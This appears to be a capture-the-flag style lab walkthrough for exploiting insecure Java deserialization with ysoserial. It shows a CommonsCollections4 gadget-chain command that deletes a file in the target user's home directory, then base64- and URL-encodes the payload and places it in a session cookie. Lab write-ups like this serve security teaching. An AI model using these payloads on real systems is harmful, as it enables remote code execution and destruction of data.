
> java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ [payload] '[command]' 

1. The above command are useful if your Java version is above > 16
2. Download the file at [https://github.com/frohoff/ysoserial/releases/tag/v0.0.6](https://github.com/frohoff/ysoserial/releases/tag/v0.0.6)
3. Log in using `wiener` account;
4. Verify that the session cookie, have a serialized object;

![](/static/img/Pasted_image_20231126200926.png)
5. Execute the following command to remove the `carlos` user;

```bash
java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

![](/static/img/Pasted_image_20231127085426.png)

> Download Java 8 it's better

6. URL encode all data and send

![](/static/img/Pasted_image_20231127090620.png)

![](/static/img/Pasted_image_20231127090629.png)